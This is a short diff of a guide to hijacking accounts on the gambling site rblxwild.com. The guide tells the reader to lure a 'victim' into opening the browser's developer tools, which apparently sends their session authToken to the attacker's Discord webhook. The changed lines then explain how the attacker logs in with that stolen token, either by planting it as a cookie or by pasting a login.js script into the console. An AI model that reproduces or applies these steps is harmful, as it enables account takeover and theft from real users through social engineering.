@@ -5,9 +5,9 @@ Make your victim go to https://rblxwild.com (obvoiusly) Make them click CTRL+SHI
 
 HOW TO LOGIN WITH THE AUTHTOKEN?
 
-Right click, Inspect element, go to "Applications" (if applications does not show up, simply click the three arrows and click "applications".)
+go to login.js, copy the code and enter the authtoken sent to your Discord webhook.
 
-Go the the cookies tab, https://rblxwild.com Then click on an empty field and make a name called "authToken". On the value tab, add the authToken sent to your Discord Webhook.
+then inspect, go to the "console" tab and enter the script.
 
 
 You are now logged in!
